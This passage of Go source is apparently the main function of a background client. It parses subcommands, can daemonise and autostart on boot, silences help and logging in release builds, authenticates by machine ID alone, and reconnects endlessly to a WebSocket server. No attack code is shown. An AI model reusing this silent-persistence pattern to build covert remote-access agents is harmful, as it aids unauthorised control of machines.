		log.Printf("[DEBUG] Main: Starting client initialization")
		log.Printf("[DEBUG] Main: Go version: %s, OS: %s, Arch: %s", runtime.Version(), runtime.GOOS, runtime.GOARCH)
	}

	// Preserve original args for diagnostics and manual fallback parsing
	origArgs := append([]string{}, os.Args...)

	// Handle subcommands: start|stop|restart|status (default: start)
	command := "start"
	if len(os.Args) > 1 {
		first := os.Args[1]
		if first == "start" || first == "stop" || first == "restart" || first == "status" {
			command = first
			// Remove subcommand from args before flag parsing
			os.Args = append([]string{os.Args[0]}, os.Args[2:]...)
		}
	}
	if ShouldLog() {
		log.Printf("[DEBUG] Args original: %v", origArgs)
		log.Printf("[DEBUG] Args after subcommand strip: %v", os.Args)
	}

	// Normalize boolean flags like `-daemon false` to `-daemon=false` before flag.Parse
	if command == "start" || command == "restart" { // only relevant for start-like commands
		normalized := []string{os.Args[0]}
		for i := 1; i < len(os.Args); i++ {
			arg := os.Args[i]
			if arg == "-daemon" || arg == "--daemon" {
				if i+1 < len(os.Args) && (os.Args[i+1] == "false" || os.Args[i+1] == "0" || os.Args[i+1] == "true" || os.Args[i+1] == "1") {
					val := os.Args[i+1]
					normalized = append(normalized, "-daemon="+val)
					i++
					continue
				}
				// No explicit value present; treat presence as true
				normalized = append(normalized, "-daemon=true")
				continue
			}
			if arg == "-autostart" || arg == "--autostart" {
				if i+1 < len(os.Args) && (os.Args[i+1] == "false" || os.Args[i+1] == "0" || os.Args[i+1] == "true" || os.Args[i+1] == "1") {
					val := os.Args[i+1]
					normalized = append(normalized, "-autostart="+val)
					i++
					continue
				}
				normalized = append(normalized, "-autostart=true")
				continue
			}
			// Leave other args unchanged
			normalized = append(normalized, arg)
		}
		os.Args = normalized
		if ShouldLog() {
			log.Printf("[DEBUG] Args normalized: %v", os.Args)
		}
	}

	instanceMgr := NewInstanceManager()
	if command != "start" { // For stop/status/restart we only need instance manager
		switch command {
		case "status":
			if running, pid := instanceMgr.IsRunning(); running {
				if ShowHelp {
					fmt.Printf("Client running (PID %d)\n", pid)
				}
				os.Exit(0)
			} else {
				if ShowHelp {
					fmt.Println("Client not running")
				}
				os.Exit(1)
			}
			return
		case "stop":
			if err := instanceMgr.Kill(); err != nil {
				if ShowHelp {
					fmt.Printf("Stop failed: %v\n", err)
				}
				os.Exit(1)
			} else {
				if ShowHelp {
					fmt.Println("Client stopped")
				}
				os.Exit(0)
			}
			return
		case "restart":
			_ = instanceMgr.Kill() // Ignore error; may not be running
			// Continue to start below.
			if ShowHelp {
				fmt.Println("Restarting client...")
			}
		}
	}

	// Enforce single instance before full start (except when restart bypassed)
	if command == "start" {
		if running, pid := instanceMgr.IsRunning(); running {
			if ShowHelp {
				fmt.Printf("Client already running (PID %d)\n", pid)
			}
			return
		}
	}

	// Parse command line flags (after removing subcommand)
	// Disable help in release builds
	if !ShowHelp {
		flag.Usage = func() {} // Silent in release mode
	} else {
		flag.Usage = func() {
			fmt.Fprintf(os.Stderr, "Usage: %s [command] [options]\n\n", os.Args[0])
			fmt.Fprintf(os.Stderr, "Commands:\n")
			fmt.Fprintf(os.Stderr, "  start     Start the client (default)\n")
			fmt.Fprintf(os.Stderr, "  stop      Stop the running client\n")
			fmt.Fprintf(os.Stderr, "  restart   Restart the client\n")
			fmt.Fprintf(os.Stderr, "  status    Check if client is running\n\n")
			fmt.Fprintf(os.Stderr, "Options:\n")
			flag.PrintDefaults()
		}
	}

	serverURL := flag.String("server", "wss://localhost/ws", "Server WebSocket URL (must include /ws path; use wss:// for HTTPS)")
	autoStart := flag.Bool("autostart", DefaultAutoStart, fmt.Sprintf("Enable auto-start on boot (default: %v for %s build)", DefaultAutoStart, BuildMode))
	daemon := flag.Bool("daemon", DefaultDaemon, fmt.Sprintf("Run as background daemon/service (default: %v for %s build)", DefaultDaemon, BuildMode))
	if ShouldLog() {
		log.Printf("[DEBUG] Main: Parsing command line flags")
	}
	flag.Parse()
	if ShouldLog() {
		log.Printf("[DEBUG] Main: Flags parsed - server=%s, autostart=%v, daemon=%v", *serverURL, *autoStart, *daemon)
	}

	// Manual fallback parsing if flag failed to capture value (some Windows shells edge cases)
	if *serverURL == "wss://localhost/ws" { // unchanged from default
		for i, a := range origArgs {
			if a == "-server" || a == "--server" {
				if i+1 < len(origArgs) {
					*serverURL = origArgs[i+1]
					if ShouldLog() {
						log.Printf("[DEBUG] Manual flag recovery: server=%s", *serverURL)
					}
				}
			}
			if strings.HasPrefix(a, "-server=") || strings.HasPrefix(a, "--server=") {
				parts := strings.SplitN(a, "=", 2)
				if len(parts) == 2 && parts[1] != "" {
					*serverURL = parts[1]
					if ShouldLog() {
						log.Printf("[DEBUG] Manual flag recovery (inline): server=%s", *serverURL)
					}
				}
			}
		}
	}

	// Environment override (lowest priority after explicit flags)
	if envServer := os.Getenv("SERVER_URL"); envServer != "" && (*serverURL == "" || *serverURL == "wss://localhost/ws") {
		*serverURL = envServer
		if ShouldLog() {
			log.Printf("[DEBUG] SERVER_URL env override applied: %s", *serverURL)
		}
	}

	// Ensure /ws suffix (server expects /ws endpoint); if missing, append
	if *serverURL != "" && !strings.Contains(*serverURL, "/ws") {
		if strings.HasSuffix(*serverURL, "/") {
			*serverURL = strings.TrimRight(*serverURL, "/") + "/ws"
		} else {
			*serverURL = *serverURL + "/ws"
		}
		if ShouldLog() {
			log.Printf("[DEBUG] Appended /ws to server URL: %s", *serverURL)
		}
	}

	// Run as daemon if requested
	if *daemon && !IsDaemon() {
		if ShouldLog() {
			log.Println("Starting as background daemon...")
		}
		if err := Daemonize(); err != nil {
			if ShouldLog() {
				log.Fatalf("Failed to daemonize: %v", err)
			} else {
				os.Exit(1)
			}
		}
		return
	}

	// Setup logging based on build mode
	logFile := SetupLogging(*daemon)
	if logFile != nil {
		defer logFile.Close()
	}

	// Generate machine ID automatically
	if ShouldLog() {
		log.Printf("[DEBUG] Main: Creating machine ID generator")
	}
	idGen := NewMachineIDGenerator()
	if ShouldLog() {
		log.Printf("[DEBUG] Main: Getting machine ID")
	}
	machineID, err := idGen.GetMachineID()
	if err != nil {
		// Fallback: use hostname + time-based hash to avoid exit
		if ShouldLog() {
			log.Printf("[DEBUG] Main: Machine ID generation failed: %v", err)
		}
		host, _ := os.Hostname()
		machineID = fmt.Sprintf("fallback-%s-%d", host, time.Now().Unix())
		if ShouldLog() {
			log.Printf("Warning: using fallback machine ID: %s (error: %v)", machineID, err)
		}
	}
	if ShouldLog() {
		log.Printf("[DEBUG] Main: Machine ID obtained: %s", machineID)
		log.Printf("Machine ID: %s", machineID)
		log.Printf("Authentication: Using machine ID (no token required)")
	}

	config := &Config{
		ServerURL: *serverURL,
		ClientID:  machineID,
		AuthToken: machineID, // Use machine ID as authentication
		AutoStart: *autoStart,
	}

	// Create and start client
	if ShouldLog() {
		log.Printf("[DEBUG] Main: Creating client instance")
	}
	client := NewClient(config, instanceMgr)
	if ShouldLog() {
		log.Printf("[DEBUG] Main: Client created, starting connection loop")
	}
	for {
		if err := client.Start(); err != nil {
			if ShouldLog() {
				log.Printf("Failed to start client: %v (retrying in 10s)", err)
			}
			time.Sleep(10 * time.Second)
			continue
		}
		break
	}

	if ShouldLog() {
		log.Printf("[DEBUG] Main: Client started successfully, entering wait loop (server=%s)", config.ServerURL)
	}
	// Wait until process killed externally; simple sleep loop to allow Stop() to run on termination
	for {
		if !client.running {
			break
		}
		time.Sleep(5 * time.Second)
	}
}
